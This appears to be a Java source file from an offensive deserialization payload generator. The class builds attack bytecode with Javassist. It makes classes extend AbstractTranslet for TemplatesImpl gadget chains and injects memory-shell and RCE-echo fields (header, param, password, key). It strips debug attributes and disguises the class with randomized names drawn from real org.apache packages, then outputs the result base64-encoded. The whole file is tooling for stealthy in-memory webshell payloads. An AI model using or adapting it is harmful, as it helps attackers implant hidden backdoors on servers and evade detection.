package com.ppp.middleware.builder;

import com.ppp.JavaClassHelper;
import com.ppp.Printer;
import com.ppp.annotation.JavaClassModifiable;
import com.ppp.utils.maker.AnnotationUtils;
import com.ppp.utils.maker.CryptoUtils;
import com.ppp.utils.maker.JavaClassUtils;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.bytecode.*;

import java.net.URL;
import java.util.*;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;

/**
 * @author Whoopsunix
 */
public class JavaClassModifier {

    /**
     * 修改 JavaClass 信息，继承 AbstractTranslet 判断
     *
     * @param ctClass
     * @param javaClassHelper
     * @throws Exception
     */
    public static byte[] ctClassBuilderExt(CtClass ctClass, JavaClassHelper javaClassHelper) throws Exception {
        // 继承 AbstractTranslet
        extendsAbstractTranslet(ctClass, javaClassHelper);

        // JavaClass 信息修改
        byte[] classBytes = ctClassBuilder(ctClass, javaClassHelper);

        return classBytes;
    }

    /**
     * 修改 JavaClass 信息，通用
     *
     * @param ctClass
     * @param javaClassHelper
     * @throws Exception
     */
    public static byte[] ctClassBuilder(CtClass ctClass, JavaClassHelper javaClassHelper) throws Exception {
        ctClass.rebuildClassFile();
        // 清除所有注解
        JavaClassUtils.clearAllAnnotations(ctClass);

        if (javaClassHelper.getCLASSNAME() != null) {
            // 用于需要类名来生成的内存马
            ctClass.setName(javaClassHelper.getCLASSNAME());
            Printer.blueInfo("JavaClass Name (Also MS ClassName): " + javaClassHelper.getCLASSNAME());
        } else if (javaClassHelper.isRandomJavaClassName()) {
            // 随机类名
            String javaClassName = randomJavaClassName(javaClassHelper);
            // 修改类名
            ctClass.setName(javaClassName);
            Printer.blueInfo("JavaClass Name: " + javaClassName);
        }

        // 目前唯一用处 用于本地文件加载时必要的类名
        if (javaClassHelper.getJavaClassName() == null) {
            // 保证该字段不为空 直接构建的 CtClass 也是有类名的 所以不存在报错
            javaClassHelper.setJavaClassName(ctClass.getName());
        }

//        // 移除类文件部分属性
        ClassFile classFile = ctClass.getClassFile();
//        // 源文件信息
        classFile.removeAttribute(SourceFileAttribute.tag);
//        // 移除行号信息
        classFile.removeAttribute(LineNumberAttribute.tag);
        classFile.removeAttribute(LocalVariableAttribute.tag);
        classFile.removeAttribute(LocalVariableAttribute.typeTag);
        classFile.removeAttribute(DeprecatedAttribute.tag);
        classFile.removeAttribute(SignatureAttribute.tag);
        classFile.removeAttribute(StackMapTable.tag);

        byte[] classBytes = ctClass.toBytecode();


        // jdk5
//        ctClass.getClassFile().setVersionToJava5();
//        byte[] classBytes = ctClass.toBytecode();
        // jdk 5
//        classBytes[7] = 49;
//
//        // jdk1.6
//        ctClass.defrost();
//        ctClass.getClassFile().setMajorVersion(50);
        classBytes[7] = 50;

        Printer.blueInfo("JavaClass: " + CryptoUtils.base64encoder(classBytes));
        ctClass.writeFile("/tmp");
        return classBytes;
    }

    /**
     * 是否继承 AbstractTranslet
     *
     * @param ctClass
     * @param javaClassHelper
     * @throws Exception
     */
    public static void extendsAbstractTranslet(CtClass ctClass, JavaClassHelper javaClassHelper) throws Exception {
        if (!javaClassHelper.isExtendsAbstractTranslet()) {
            return;
        }
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass superCtClass = pool.get(AbstractTranslet.class.getName());
        ctClass.setSuperclass(superCtClass);
        Printer.yellowInfo("extends AbstractTranslet");
    }

    /**
     * 内存马、RceEcho 回显的字段
     *
     * @param cls
     * @param ctClass
     * @param javaClassHelper
     * @throws Exception
     */
    public static void fieldChange(Class cls, CtClass ctClass, JavaClassHelper javaClassHelper) throws Exception {
        // 适用于自定义内存马的时候 直接跳过
        if (javaClassHelper == null)
            return;

        // 内存马类名
        if (AnnotationUtils.containsValue(cls, JavaClassModifiable.class, JavaClassModifiable.CLASSNAME)) {
            JavaClassUtils.fieldChangeIfExist(ctClass, JavaClassModifiable.CLASSNAME, String.format("private static String %s = \"%s\";", JavaClassModifiable.CLASSNAME, javaClassHelper.getCLASSNAME()));
        }


        // 固定
        if (AnnotationUtils.containsValue(cls, JavaClassModifiable.class, JavaClassModifiable.HEADER)) {
            JavaClassUtils.fieldChangeIfExist(ctClass, JavaClassModifiable.HEADER, String.format("private static String %s = \"%s\";", JavaClassModifiable.HEADER, javaClassHelper.getHEADER()));
        }
        if (AnnotationUtils.containsValue(cls, JavaClassModifiable.class, JavaClassModifiable.PARAM)) {
            JavaClassUtils.fieldChangeIfExist(ctClass, JavaClassModifiable.PARAM, String.format("private static String %s = \"%s\";", JavaClassModifiable.PARAM, javaClassHelper.getPARAM()));
        }

        if (AnnotationUtils.containsValue(cls, JavaClassModifiable.class, JavaClassModifiable.pass)) {
            JavaClassUtils.fieldChangeIfExist(ctClass, JavaClassModifiable.pass, String.format("private static String %s = \"%s\";", JavaClassModifiable.pass, javaClassHelper.getPass()));
        }
        if (AnnotationUtils.containsValue(cls, JavaClassModifiable.class, JavaClassModifiable.key)) {
            JavaClassUtils.fieldChangeIfExist(ctClass, JavaClassModifiable.key, String.format("private static String %s = \"%s\";", JavaClassModifiable.key, javaClassHelper.getKey()));
        }
    }

    /**
     * 生成随机包类名
     * 借鉴了 su18 ysuserial 的思路重新实现
     *
     * @return
     */
    public static String randomJavaClassName(JavaClassHelper javaClassHelper) {
        // 真实包名
        String realPackageName = "org.apache";
        String javaClassPackageHost = javaClassHelper.getJavaClassPackageHost();

        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        Set<String> classNames = getClassNamesFromPackage(classLoader, realPackageName);

        // 随机获取一个类名
        Object[] array = classNames.toArray();
        int randomIndex = new Random().nextInt(array.length);
        String originalClassName = (String) array[randomIndex];

        // 随机组合
        List<String> parts = Arrays.asList(originalClassName.replace(realPackageName + ".", "").split("\\."));
        Collections.shuffle(parts);

        StringBuilder javaClassName = new StringBuilder();
        if (javaClassPackageHost != null) {
            Printer.yellowInfo("javaClass Package Host: " + javaClassPackageHost);
            javaClassName.append(javaClassPackageHost);
        } else {
            javaClassName.append(realPackageName);
        }

        for (int i = 0; i < parts.size(); i++) {
            String part = parts.get(i).toLowerCase();

            if (i == parts.size() - 1) {
                part = part.substring(0, 1).toUpperCase() + part.substring(1);
            }
            if (javaClassName.length() > 0) {
                javaClassName.append(".");
            }
            part = part.replaceAll("\\d", "");
            javaClassName.append(part);
        }

        return javaClassName.toString();
    }

    /**
     * 获取真实类名
     *
     * @param classLoader
     * @param packageName
     * @return
     */
    public static Set<String> getClassNamesFromPackage(ClassLoader classLoader, String packageName) {
        Set<String> classNames = new HashSet();

        packageName = packageName.replace('.', '/');
        Enumeration<URL> resources;
        try {
            resources = classLoader.getResources(packageName);
            while (resources.hasMoreElements()) {
                URL resource = resources.nextElement();
                classNames.addAll(getClassNamesFromResource(resource, packageName));
            }
        } catch (Exception e) {

        }

        return classNames;
    }

    public static Set<String> getClassNamesFromResource(URL resource, String packageName) {
        Set<String> classNames = new HashSet();
        String protocol = resource.getProtocol();

        if ("jar".equals(protocol)) {
            classNames.addAll(getClassNamesFromJar(resource, packageName));
        }

        return classNames;
    }

    public static Set<String> getClassNamesFromJar(URL resource, String packageName) {
        Set<String> classNames = new HashSet();

        String jarPath = resource.getPath().split("!")[0].replace("file:", "");
        try (JarFile jarFile = new JarFile(jarPath)) {
            Enumeration<JarEntry> entries = jarFile.entries();

            while (entries.hasMoreElements()) {
                JarEntry entry = entries.nextElement();
                String entryName = entry.getName();
                // 内部类处理起来太麻烦不要了
                if (entryName.startsWith(packageName) && entryName.endsWith(".class") && !entryName.contains("$")) {
                    String className = entryName.replace('/', '.').replace(".class", "");
                    classNames.add(className);
                }
            }
        } catch (Exception e) {

        }

        return classNames;
    }


}
